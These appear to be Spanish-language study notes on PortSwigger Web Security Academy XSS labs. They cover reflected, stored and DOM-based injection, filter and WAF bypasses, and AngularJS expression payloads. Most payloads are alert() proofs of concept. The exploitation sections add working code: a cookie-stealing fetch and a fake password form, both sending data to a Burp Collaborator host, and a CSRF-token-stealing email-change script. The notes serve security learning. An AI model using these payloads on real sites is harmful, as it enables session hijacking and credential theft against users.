# XSS Portswigger

## Table of contents

- [XSS Portswigger](#xss-portswigger)
  - [Prueba de concepto XSS](#prueba-de-concepto-xss)
  - [EXPLOTACION](#explotacion)
    - [(reflected) html context nothing encoded](#reflected-html-context-nothing-encoded)
    - [(stored) html context nothing encoded](#stored-html-context-nothing-encoded)
    - [(dom based) document write sink](#dom-based-document-write-sink)
    - [(dom based) innerhtml sink](#dom-based-innerhtml-sink)
    - [(dom based) jquery href attribute sink](#dom-based-jquery-href-attribute-sink)
    - [(dom based) jquery selector hash change event](#dom-based-jquery-selector-hash-change-event)
    - [(contexts) attribute angle brackets html encoded](#contexts-attribute-angle-brackets-html-encoded)
    - [(contexts) href attribute double quotes html encoded](#contexts-href-attribute-double-quotes-html-encoded)
    - [(contexts) javascript string angle brackets html encoded](#contexts-javascript-string-angle-brackets-html-encoded)
    - [(dom based) document write sink inside select element](#dom-based-document-write-sink-inside-select-element)
    - [(dom based) angularjs expression](#dom-based-angularjs-expression)
    - [(dom based) dom xss reflected](#dom-based-dom-xss-reflected)
    - [(dom based) dom xss stored](#dom-based-dom-xss-stored)
    - [(exploiting) Exploiting cross-site scripting to steal cookies](#exploiting-exploiting-cross-site-scripting-to-steal-cookies)
    - [(exploiting) Exploiting cross-site scripting to capture passwords](#exploiting-exploiting-cross-site-scripting-to-capture-passwords)
    - [(exploiting) Exploiting XSS to perform CSRF](#exploiting-exploiting-xss-to-perform-csrf)
    - [(contexts) Reflected XSS into HTML context with most tags and attributes blocked](#contexts-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked)
    - [(contexts) Reflected XSS into HTML context with all tags blocked except custom ones](#contexts-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones)
    - [(contexts) Reflected XSS with some SVG markup allowed](#contexts-reflected-xss-with-some-svg-markup-allowed)
    - [(contexts) Reflected XSS in canonical link tag](#contexts-reflected-xss-in-canonical-link-tag)
    - [(contexts) Reflected XSS into a JavaScript string with single quote and backslash escaped](#contexts-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped)
    - [(contexts) Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](#contexts-reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped)
    - [(contexts) Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](#contexts-stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped)
    - [(contexts) Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](#contexts-reflected-xss-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-unicode-escaped)

## Prueba de concepto XSS

Puede confirmar la mayoría de los tipos de vulnerabilidades XSS inyectando una carga útil que hace que su propio navegador ejecute código JavaScript arbitrario. Durante mucho tiempo ha sido una práctica común usar la función `alert()` para este propósito porque es corta, inofensiva y bastante difícil de pasar por alto cuando se llama con éxito.

Desafortunadamente, hay un pequeño problema si usas Chrome. Desde la versión 92 en adelante (20 de julio de 2021), se impide que los iframes de origen cruzado llamen a `alert()`. Como estos se usan para construir algunos de los ataques XSS más avanzados, a veces necesitará usar una carga útil de PoC alternativa. En este escenario, recomendamos la función `print()`.

## EXPLOTACION

### (reflected) html context nothing encoded

Una pagina tiene una opcion de busqueda:

![[Pasted image 20230222114715.png]]

vemos que lo que colocamos se refleja en el output, en el codigo fuente parece que lo concatena al contenido de una etiqueta:

![[Pasted image 20230222114732.png]]

podemos colocar el siguiente payload:

```html
<script>alert(1)</script>
```

al concatenarse en el HTML, se mostrara:

![[Pasted image 20230222115322.png]]

### (stored) html context nothing encoded

una pagina tiene post y permite agregar comentarios, vemos que el campo de comentario se refleja en la pagina:

![[Pasted image 20230222145625.png]]

el comentario lo esta colocando en una etiqueta **\<p\>**:

![[Pasted image 20230222145711.png]]

vamos a ver si podemos inyectar codigo HTML:

![[Pasted image 20230222150050.png]]

vemos que si se interpreta y lo coloca en el codigo HTML sin desinfectar:

![[Pasted image 20230222150127.png]]

por lo que podemos inyectar JS:

```html
<script>alert(1)</script>
```

como es almacenado, cada vez que volvamos a ver los comentarios saldra el `alert()`.

### (dom based) document write sink

una pagina tiene una opcion de busqueda y vemos que se muestra el valor ingresado en el output:

![[Pasted image 20230222152243.png]]

si buscamos en el codigo fuente donde coloca ese output vemos lo siguiente:

![[Pasted image 20230222152437.png]]

vemos que se incluye en el **src** de una etiqueta **img**, podemos cerrar la etiqueta y usar un payload que se auto invoque:

```html
"><img src/onerror="alert(1)">
```

esto nos mostrara el `alert()`

### (dom based) innerhtml sink

una pagina tiene la opcion de busqueda y veos que se refleja el dato ingresado:

![[Pasted image 20230222153601.png]]

si vemos el codigo fuente, vemos la logica JS para la busqueda:

![[Pasted image 20230222153648.png]]

esta utilizando **innerHTML** un sink que no realiza la limpieza de datos por defecto, podemos colocar un payload XSS que se auto invoque para que se concatene en el HTML:

```html
<img src/onerror="alert(1)">
```

esto nos mostrara el `alert()`

### (dom based) jquery href attribute sink

Si se utiliza una biblioteca de JavaScript como jQuery, busque sink que puedan alterar los elementos DOM en la página. Por ejemplo, la función de jQuery `attr()` puede cambiar los atributos de los elementos DOM. Si los datos se leen de una fuente controlada por el usuario, como la URL, y luego se pasan a la función `attr()`, entonces es posible manipular el valor enviado para causar XSS. Por ejemplo, aquí tenemos algo de JavaScript que cambia el atributo `href` de un elemento de anclaje utilizando datos de la URL:

```javascript
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

Puede explotar esto modificando la URL para que la `location.search`fuente contenga una URL JavaScript maliciosa. Después de que el JavaScript de la página aplique esta URL maliciosa al vínculo de retroceso `href`, al hacer clic en el vínculo de retroceso se ejecutará:

por ejemplo:

una pagina tiene una opcion de subir un feedback:

![[Pasted image 20230222155519.png]]

si vemos el codigo fuente hay un codigo JS vulnerbale a DOM XSS:

![[Pasted image 20230222155609.png]]

aqui esta obteniendo un parametro de la URL llamado **returnPath** que mediante la funcion de jquery `attr()` esta dandole un valor a atributo `href`, vismos que esto es vulnerable, podemos colocar esto en la url:

```http
/feedback?returnPath=javascript:alert(1)
```

a la hora de reemplazar quedara asi:

```html
<a id="backLink" href="javascript:alert(1)">Back</a>
```

lo cual al pinchar en el boton mostrara un `alert()`

### (dom based) jquery selector hash change event

Otro sink potencial a tener en cuenta es la función de selección `$()` de jQuery, que se puede usar para inyectar objetos maliciosos en el DOM.

Un uso comun de este selector es para usar la funcion `location.hash` y bajar el scroll hasta donde corresponda, la implementacion es algo asi:

```javascript
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

Como `hash` es controlable por el usuario, un atacante podría usar esto para inyectar un vector XSS en el sink del selector `$()`.

>[!note]
>Las versiones más recientes de jQuery han parcheado esta vulnerabilidad en particular al evitar que inyecte HTML en un selector cuando la entrada comienza con un carácter hash (`#`). Sin embargo, aún puede encontrar código vulnerable en la naturaleza.

por ejemplo:

una pagina en el codigo fuente tiene el siguiente codigo JS:

![[Pasted image 20230222181256.png]]

esta usando el selector `$()` y tomando el hash de la URL, entonces como sabemos que este selector inyecta objetos en el DOM podemos crear un payload que se autoinvoque:

```html
<img src/onerror="alert(1)">
```

![[Pasted image 20230222181427.png]]

ahora para compartir esto a otra persona y que tenga el mismo efecto podemos usar un **iframe** que activa la funcion **hashchange**:

```html
<iframe src="https://0ac6007804a2c4aac27f89ce003300c0.web-security-academy.net/#%3Cimg%20src/onerror=%22alert(1)%22%3E"></iframe>
```

```html
<iframe src="https://0ac6007804a2c4aac27f89ce003300c0.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

### (contexts) attribute angle brackets html encoded

una pagina tiene la opcion de busqueda y veos que se refleja el dato ingresado:

![[Pasted image 20230222231948.png]]

si inspeccionamos la pagina podemos buscar donde refleja el output:

![[Pasted image 20230222232106.png]]

el segundo valor es un atributo, podemos cerrar la etiqueta y concatenar con una etiqueta **\<script\>**:

```html
"><script>alert(1)</script>
```

![[Pasted image 20230222232308.png]]

resulta que la pagina realiza el limpiado de caracteres (**<>**) y los HTML encodea. Podriamos decir que no es vulnerable, pero otra opcion que podemos intentar es agregar otro atributo (un evento) que se auto invoque.

podemos usar diferentes eventos:

- **onclick**: se hace click sobre el objeto
- **onmouseover**: el cursor se pone encima del elemento
- **onmouseout**: el cursor primero entra y luego se activa el evento cuando sale del objeto
- **onkeydown**: el usuario presiona una tecla en el objeto
- **onload**: el navegador termina de cargar la pagina
- **ondblclick**: se hace doble click

[https://www.w3schools.com/jsref/dom_obj_event.asp](https://www.w3schools.com/jsref/dom_obj_event.asp)

provemos con **onmouseover**:

```html
test" onmouseover="alert(1)
```

>[!success]
>no cerramos las comillas del final porque al implementarse en el codigo se cierra.

![[Pasted image 20230222232638.png]]

al colocar el curso sobre el input se nos muestra el `alert()`.

### (contexts) href attribute double quotes html encoded

al cargar un comentario el campo **website** se incrusta en el campo **href** de un objeto HTML:

![[Pasted image 20230223192823.png]]

![[Pasted image 20230223192841.png]]

podriamos cerrar la etiqueta (`">`) y colocar un payload basico:

```html
"><script>alert('XSS')</script>
```

pero la pagina encodea las comillas dobles con `&quot;`:

![[Pasted image 20230223193305.png]]

como manera alternativa podemos colocar el siguiente contenido en atributos como **href** o similares. Tambien funciona con algunos eventos JS:

```javascript
javascript:alert('XSS')
```

esto ejecutara el codigo JS:

![[Pasted image 20230223193508.png]]

si seleccionamos el nombre nos mostrara el `alert()`:

![[Pasted image 20230223193603.png]]
### (contexts) javascript string angle brackets html encoded

cuando buscamos un post vemos que la entrada de incrusta en codigo JS de la pagina:

![[Pasted image 20230223194822.png]]

![[Pasted image 20230223194854.png]]

los caracteres  `<>` estan encodeados por lo que no podriamos agregar etiquetas nuevas o cerrar la etiqueta `<script>`:

![[Pasted image 20230223200204.png]]

entonces podriamos cerrar la variable y colocar nuestro codigo:

```javascript
';alert('XSS');//
```

![[Pasted image 20230223200350.png]]

y se nos mostrara el `alert()`.

podriamos usar este payload:

```javascript
'-alert(1)-'
```

### (dom based) document write sink inside select element

una tienda tiene la opcion de calcular el stock de un producto:

![[Pasted image 20230223205832.png]]

si inspeccionamos el codigo fuente vemos la logica de JS:

![[Pasted image 20230223210102.png]]

1. se obtiene un parametro de la URL llamado **storeId** usando **window.location.search**
2. verifica si el valor no es nulo (si existe)
3. se usa el sink **document.write** para crear una etiqueta y concatenar el valor de **storeId** (valor controlado por el usuario)

vamos a comprobar colocando como valor `chris</option></select><h1>XSS</h1>`

```http
/product?productId=2&storeId=chris</option></select><h1>XSS</h1>
```

![[Pasted image 20230223210948.png]]

se interpreto las etiquetas, por lo que el siguiente payload mostrar un `alert`:

```html
<script>alert('xss')</script>
```

![[Pasted image 20230223211121.png]]

### (dom based) angularjs expression

Si se usa un framework como AngularJS, es posible ejecutar JavaScript sin paréntesis angulares ni eventos. Cuando un sitio usa el atributo `ng-app` en un elemento HTML, ejecutará JavaScript dentro de llaves dobles que pueden ocurrir directamente en HTML o dentro de atributos.

podemos validar que la pagina este utilizando la directiva `ng-app`:

![[Pasted image 20230224094527.png]]

existen ya payloads descubiertos que podemos colocar en cualquier campo de entrada:

```javascript
{{constructor.constructor('alert(1)')()}}

{{$on.constructor('alert(1)')()}}
```

cualquiera de estos payload mostrar un `alert()` colocandolo en cualquier campo de entrada que se refleje

>[!success]
>**Esta es una alterenativa cuando se encodea los siguientes caracteres `<>""` y no pueden ser usados.**

### (dom based) dom xss reflected

una pagina tiene una opcion de busqueda:

![[Pasted image 20230224143029.png]]

si revisamos el codigo fuente vemos que llaman a un JS externo:

![[Pasted image 20230224143144.png]]

si vemos el contenido del script:

![[Pasted image 20230224143224.png]]

1. usa una funcion insegura `eval()` y se le pasa el output del punto 2.
2. realiza una peticion a la variable **path** que si vemos en la imagen anterio tiene el valor de **search-results** y se concaena el valor de **windows.location.search** que es nuestro valor de busqueda GET:

![[Pasted image 20230224143842.png]]

en el **HTTP History** de burpsuite se puede observar:

![[Pasted image 20230224143944.png]]

podemos colocar el siguiente payload:

```javascript
"-alert(1)}//
```

![[Pasted image 20230224144126.png]]

vemos en el resultado que esta escapando el caracter `"`, podemos probar evadir esto de la siguiente manera:

![[Pasted image 20230224145443.png]]

[https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#escaping-javascript-escapes](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#escaping-javascript-escapes)

por lo que el paylod seria:

```javascript
\"-alert(1)}//
```

![[Pasted image 20230224145632.png]]

ya no lo toma como parte de la cadena, por lo que este payload si funciona.

![[Pasted image 20230224145755.png]]

podemos intentar con otro payloads:

```javascript
'-alert(1)-'
\'-alert(1)-'
\'-alert(1)-//
\'-alert(1)//
\"-alert(1)//
\"-alert(1)}//
```

### (dom based) dom xss stored

una pagina tiene una opcion de comentar en un post y el autor como el comentario se reflejan en la pagina:

![[Pasted image 20230224222502.png]]

si vemos el codigo fuente de la aplicacion, vemos que utiliza un script para cargar los comentarios:

![[Pasted image 20230224222608.png]]

el codigo JS contiene lo siguiente:

![[Pasted image 20230224222744.png]]

en resumen:

1. se hace la peticion al parametro que se le pasa (**/post/comment**) mas el windows.location.search (**?postId=7**)
2. se tiene una funcion de limpieza de caracteres `<>` reemplazandolos por `&lt;` y `&gt;`
3. se usa un sink inseguro (**innerHTML**) para concatenar el contenido de author usando la funcion de limpieza de caracteres.

viendo el historial de burpsuite puedes encontrar la peticion que se hace en el punto 1:

![[Pasted image 20230224223139.png]]

el campo author se concatena en el HTML:

![[Pasted image 20230224223248.png]]

tiene una funcion de reemplazo de caracteres asi que este payload no seria posible:

```html
<script>alert(1)</script>
```

ademas no es posible concatenar un atributo, un evento o comentar codigo, entonces que hacemos?

la vulnerabilidad aqui esta en la funcion de limpieza ya que usa una funcion llamada **replace**:

![[Pasted image 20230224223432.png]]

veamos que dice la documentacion:

estructura de la funcion:

```javascript
replace(pattern,replacement)
```

![[Pasted image 20230224223621.png]]

la ultima parte es importante, si no se usa un argumente regex como `pattern` solo reemplaza la primera coincidencia dejando despues la el texto como esta.

Ejemplo:

```javascript
const p = 'The quick brown fox jumps over the lazy dog. If the dog reacted, was it really lazy?';

// pattern string solo reemplaza la primera coincidencia
console.log(p.replace('dog', 'monkey'));
//"The quick brown fox jumps over the lazy monkey. If the dog reacted, was it really lazy?"


//pattern regex reemplaza TODAS las coincidencias
const regex = /Dog/i;
console.log(p.replace(regex, 'ferret'));
//"The quick brown fox jumps over the lazy ferret. If the dog reacted, was it really lazy?"
```

y como el campo nombre (**author**) pasa por esa funcion y es controlable por nosotros, podemos colocar el siguiente payload:

```javascript
<><img src/onerror="alert('XSS')">
```

al pasar por la funcion de limpieza dejara la cadena asi (eliminando la primera coincidencia):

```javascript
<img src/onerror="alert('XSS')">
```

y se ejecutara nuestro payload:

![[Pasted image 20230224224456.png]]

### (exploiting) Exploiting cross-site scripting to steal cookies

la pagina es vulnerable a XSS almacenado en comentarios de post, el usuario administrador visita la pagina despues de cada nuevo post.

usamos **burp collaborator** para obtener la cookie de sesion.

>[!success]
>si utilizamos el **burp collaborator** tenemos que desactivar el foxyproxy para que no envie payloads adicionales por las extensiones.

```html
<script>
fetch('https://ibx7ydc3qzqb2nzbzctshnnoyf45su.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

![[Pasted image 20230224233209.png]]

esperamos un poco y damos **pull now** en el **burp colaborator**:

![[Pasted image 20230224233254.png]]

obtuvimos la cookie de sesion y podemos acceder a la cuenta de administrador reemplazando la cookie en la pagina.

### (exploiting) Exploiting cross-site scripting to capture passwords

la pagina es vulnerable a XSS almacenado en comentarios de post, el usuario administrador visita la pagina despues de cada nuevo post.

podemos inyectar codigo HTML y JS para realizar un defacement a la pagina e incrustar un formulario que pida usuario y contraseña, mediante un evento en el input de contraseña **onchange**, cuando se introduzca la contraseña hacemos que se realice una peticion a nuestro **burp collaborator**:

el payload seria:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://qnhw1v9llsmgmxshyqkmp545pwvojd.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

cargamos el comentario y en poco rato recibimos informacion:

![[Pasted image 20230224234048.png]]

con las credenciales iniciamos sesion como el usuario administrator.

### (exploiting) Exploiting XSS to perform CSRF

la pagina es vulnerable a XSS almacenado en comentarios de post, el usuario administrador visita la pagina despues de cada nuevo post.

ademas la pagina tiene una funcionalidad de cambio de email que es vulnerable a CSRF.

Vamos a combinar estos 2 ataques.

vemos que la funcionalidad de cambio de email puede establecer el campo de entrada a traves de un parametro GET:

![[Pasted image 20230224234509.png]]

si actualizamos el email vemos que se envia en la peticion:

![[Pasted image 20230224235411.png]]

es una peticion **POST** que envia 2 datos, **email** y **csrf token**. Vamos a hacer uso de `XMLHttpRequest`:

1. primero para hacer una peticion y obtener el csrf-token
2. segundo para cambiar el email

el **csrf-token** se encuentra en **/my-account**:

![[Pasted image 20230224235637.png]]

entonces vamos a crear la primera request:

```html
<script>
const xhttp = new XMLHttpRequest();  
xhttp.onload = `handleResponse;`
xhttp.open("GET", "/my-account", true);  
xhttp.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
};
</script>
```

ahora creamos la segunda peticion:

```html
<script>
const xhttp = new XMLHttpRequest();  
xhttp.open("POST", "/my-account/change-email",true);  
xhttp.send('email=chris%40hacker.com&csrf='+token);
</script>
```

ahora unimos ambos:

```html
<script>
const xhttp = new XMLHttpRequest();  
xhttp.onload = handleResponse;
xhttp.open("GET", "/my-account", true);  
xhttp.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    const xhttp2 = new XMLHttpRequest();  
	xhttp2.open("POST", "/my-account/change-email",true);  
	xhttp2.send('email=chris@hacker.com&csrf='+token);
};
</script>
```

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

creamos un comentario con el siguiente contenido y lograremos cambiar la contraseña.

### (contexts) Reflected XSS into HTML context with most tags and attributes blocked

una pagina tiene una vulnerabilidad XSS reflejada en la funcionalidad de búsqueda, pero utiliza un firewall de aplicaciones web (WAF) para proteger contra los vectores XSS comunes.

el valor de busqueda se incrusta en el HTML:

![[Pasted image 20230225193321.png]]

un payload clasico como este deberia funcionar:

```html
<script>alert(1)</script>
```

pero parece que un WAF bloquea etiquetas comunes:

![[Pasted image 20230225193644.png]]

vamos a usar **intruder** para determinar cuales etiquetas estan permitidas, del siguiente enlace podemos copiar todas las etiquetas:

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

![[Pasted image 20230225193759.png]]

ahora configuramos el intruder:

![[Pasted image 20230225193855.png]]

si filtramos en los resultados por codigo de estado vemos que la etiqueta body esta permitida:

![[Pasted image 20230225194005.png]]

podemos hacer lo mismo para descubrir si algun evento esta disponible:

```html
<body (intruder_payload)=1>
```

![[Pasted image 20230225194252.png]]

![[Pasted image 20230225194343.png]]

en los resultados vemos que varios eventos estan permitidos:

![[Pasted image 20230225194436.png]]

el objetivo es entregar una URL maliciosa a la victima y que **sin interaccion del usuario** se ejecute un `print`

podemos usar el evento `onresize` que al detectar una resize en la ventana ejecuta el evento, cargamos la pagina en un **iframe** y le damos un ancho establecido, el **iframe** al cargarse comienza con un tamaña por defecto y despues de cargar podemos establecer otro junto al evento `onload`:

```html
<iframe src="https://0ab100aa045c51c4c281572300880048.web-security-academy.net/?search=<body%20onresize=print()>" onload=this.style.width='100px'>
```

con esto completaremos el ejercicio.

### (contexts) Reflected XSS into HTML context with all tags blocked except custom ones

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';

<!--<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';-->
</script>
```

Esta inyección crea una etiqueta personalizada `<xss>` con el `id=x`, que contiene un evento `onfocus`  que activa la función `alert`. El hash al final de la URL se enfoca en este elemento tan pronto como se carga la página, lo que hace que se llame a la carga útil `alert`.

### (contexts) Reflected XSS with some SVG markup allowed

El sitio está bloqueando etiquetas comunes pero pierde algunas etiquetas y eventos SVG.

```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

### (contexts) Reflected XSS in canonical link tag

- [https://portswigger.net/research/xss-in-hidden-input-fields](https://portswigger.net/research/xss-in-hidden-input-fields)

podemos cargar un parametro en la pagina principal y vemos que se refleja en el codigo en un link canonico:

![[Pasted image 20230225230939.png]]

![[Pasted image 20230225231009.png]]

la pagina bloquea los caracteres `<>`:

![[Pasted image 20230225231056.png]]

por lo que no podemos cerrar el atributo y la etiqueta y cargar un payload basico.

En el ejercicio se asume que un usuario visita la pagina a menudo y presiona la siguiente conbinacion de teclas:

-   `ALT+SHIFT+X`
-   `CTRL+ALT+X`
-   `Alt+X`

si encontramos una etiqueta **link** con un atributo `rel="canonical"`, entonces podemos utilizar este payload:

```bash
'accesskey='X'onclick='alert(1)
```

>[!note]
>No coloacmos espacio porque se url encodea a `%20`

la primera comilla cierra el `href`, al final se deja SIN comilla porque lo cierra en la incrustacion.

![[Pasted image 20230225231604.png]]

el atributo `accesskey='X'` funcion para la combinacion de teclas:

-   On Windows: `ALT+SHIFT+X`
-   On MacOS: `CTRL+ALT+X`
-   On Linux: `Alt+X`

cuando se realiza la combinacion de teclas el evento `onclick` se activa.

### (contexts) Reflected XSS into a JavaScript string with single quote and backslash escaped

>[!note]
>En este ejercicio los caracteres `'` (single quote) y `\` (backslash) estan escapados.

una pagina incrusta un parametro que buscamos en una variable de JS:

![[Pasted image 20230225235623.png]]

bueno aqui no hay que complicarnos tanto, a veces las cosas mas simples resultan. 

- no podriamos cerrar la variable y comentar lo demas (`'//`)
- no podemos escapar los caracteres escapados (`\\\'`)

algo que quizas no pensamos al comienzo es que podemos incluir etiquetas de inicio y fin ya que no usan esos caracteres, por lo que podemos cerrar la etiqueta `<script>` y abrir otra con lo que queramos:

```html
zzz</script><img src/onerror=alert(1)>

zzz</script><script>alert(1)</script>
```

![[Pasted image 20230226000921.png]]



### (contexts) Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

>[!note]
>En este ejercicio los caracteres `"` (double quote) y `<>` (angle brackets) estan URL Encoded y el caracter `'` (single quote) esta escapado.

una pagina incrusta un parametro que buscamos en una variable de JS:

![[Pasted image 20230225235623.png]]

ahora ya no podemos cerrar tags, ni la variable y usar doble escape.

pero con este payload podemos realizar un `alert()`:

```javascript
\'-alert(1)//
```

los caracteres `\'` generara la siguiente cadena `\\'`, ya que al escapar la comilla simple se cerraria la variable, ya lo demas es un payload basico:

![[Pasted image 20230226010140.png]]

![[Pasted image 20230226010221.png]]

### (contexts) Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

>[!note]
>En este ejercicio los caracteres `"` (double quote) y `<>` (angle brackets) estan HTML Encoded y el caracter `'` (single quote) y `\` (backslash) esta escapado. 

cuando cargamos un comentario en un post de una pagina, vemos que el campo **website** se incrusta en un evento **onclick** en el codigo fuente:

![[Pasted image 20230226012345.png]]

Cuando el contexto XSS es algún JavaScript existente dentro de un atributo de etiqueta entre comillas, como un controlador de eventos, es posible utilizar la codificación HTML para evitar algunos filtros de entrada.

Cuando el navegador haya analizado las etiquetas y los atributos HTML dentro de una respuesta, realizará la decodificación HTML de los valores de los atributos de la etiqueta antes de que se procesen más. Si la aplicación del lado del servidor bloquea o desinfecta ciertos caracteres que se necesitan para una explotación XSS exitosa, a menudo puede omitir la validación de entrada mediante la codificación HTML de esos caracteres.

La secuencia `&apos;` es una entidad HTML que representa un apóstrofo o una comilla simple. Debido a que el navegador HTML-decoded el valor del evento `onclick` antes de que se interprete el JavaScript, las entidades se decodifican como comillas, que se convierten en delimitadores de cadena.

payload:

```html
&apos;-alert(1)-&apos;
```

esto como website nos mostrara un `alert()`

### (contexts) Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

```javascript
${alert(1)}

${alert(string.fromcharcode(88,83,83))} //XSS
```

